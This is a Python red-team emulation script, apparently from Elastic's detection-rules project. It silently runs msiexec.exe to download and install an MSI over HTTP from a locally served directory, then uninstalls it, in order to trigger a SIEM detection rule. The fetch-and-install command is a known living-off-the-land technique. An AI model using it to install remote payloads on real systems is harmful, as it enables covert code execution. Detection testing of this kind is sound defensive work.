# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: MsiExec with HTTP Installer
# RTA: msiexec_http_installer.py
# ATT&CK:
# Description: Use msiexec.exe to download an executable from a remote site over HTTP and run it.

import logging

from . import OSType, RuleMetadata, _common, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="d90f48c5-282a-4d29-a021-fb87e220e1a5",
    name="msiexec_http_installer",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[],
    siem_rules=[
        RuleMetadata(
            id="1fe3b299-fbb5-4657-a937-1d746f2c711a", name="Unusual Network Activity from a Windows System Binary"
        )
    ],
    techniques=["T1127"],
)
def main():
    log.info("MsiExec HTTP Download")
    server, ip, port = _common.serve_dir_over_http()
    _common.clear_web_cache()
    _ = _common.execute_command(["msiexec.exe", "/quiet", "/i", "http://%s:%d/bin/Installer.msi" % (ip, port)])
    log.info("Cleanup")
    _ = _common.execute_command(
        [
            "msiexec",
            "/quiet",
            "/uninstall",
            "http://%s:%d/bin/Installer.msi" % (ip, port),
        ]
    )

    server.shutdown()
